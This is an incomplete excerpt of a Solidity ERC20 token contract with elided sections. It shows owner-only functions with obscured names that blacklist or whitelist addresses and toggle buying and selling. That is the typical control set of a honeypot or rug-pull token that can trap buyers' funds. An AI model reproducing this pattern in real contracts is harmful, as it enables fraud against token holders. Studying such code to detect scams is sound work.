...
contract Token is ERC20, Ownable {
    ...
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
      ...
      function svarta(address[] memory users, bool value) external onlyOwner {
    ...
    function Pair(address pair, bool status) external onlyOwner {
        isPair[pair] = status;
    }

    function vita(address[] memory users, bool status) external onlyOwner {
        uint256 len = users.length;
        for (uint256 i; i < len; i++) {
    ...
    function saljaa(bool status) external onlyOwner {
        isSellOpen = status;
    }

    function kopa(bool status) external onlyOwner {
        isBuyOpen = status;
    }
